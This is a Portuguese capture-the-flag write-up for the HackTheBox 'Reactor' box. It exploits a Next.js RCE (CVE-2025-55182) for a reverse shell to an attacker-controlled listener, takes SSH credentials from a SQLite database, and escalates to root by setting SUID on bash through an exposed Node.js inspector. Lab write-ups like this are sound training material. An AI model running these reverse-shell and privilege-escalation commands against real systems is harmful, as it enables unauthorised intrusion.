Reactor

HackTheBox · Easy by Brenno M.

Reactor explora uma RCE não autenticada no Next.js 15.0.3 (CVE-2025-55182, apelidada de "React2Shell") e, na fase de escalação, abusa de um processo Node.js do root exposto com --inspect, cujo protocolo de debug equivale a execução de código como root.

Reconhecimento

O Nmap revela SSH (22) e uma aplicação web na porta 3000. O fingerprint identifica um app Next.js 15.0.3 ("ReactorWatch Core").

sudo rustscan -a <IP> -- -sS -sV -Pn
# 22/tcp ssh, 3000/tcp http (Next.js 15.0.3)

Exploração - CVE-2025-55182

O Next.js 15.0.3 valida de forma insuficiente os payloads de React Server Components, permitindo injeção de comandos. Usa-se o PoC público para disparar uma reverse shell como o usuário node.

git clone https://github.com/msanft/CVE-2025-55182
nc -lvnp 4444
python3 exploit.py --target http://<IP>:3000 --lhost <MEU_IP> --lport 4444

No foothold, o banco SQLite /opt/reactor-app/reactor.db contém a tabela de usuários, as credenciais dão acesso SSH a um usuário de baixo privilégio.

sqlite3 /opt/reactor-app/reactor.db '.tables'
# users -> credenciais para SSH

Escalação - Node.js Inspector

O root executa um processo Node.js com --inspect=127.0.0.1:9229. O Chrome DevTools Protocol nesse socket permite avaliar JavaScript arbitrário dentro do processo do root. Encaminha-se a porta via SSH e injeta-se código que dá SUID ao bash.

ssh -L 9229:127.0.0.1:9229 user@<IP>
# via CDP no inspector local -> executar como root:
# require('child_process').execSync('chmod +s /bin/bash')
/bin/bash -p
cat /root/root.txt
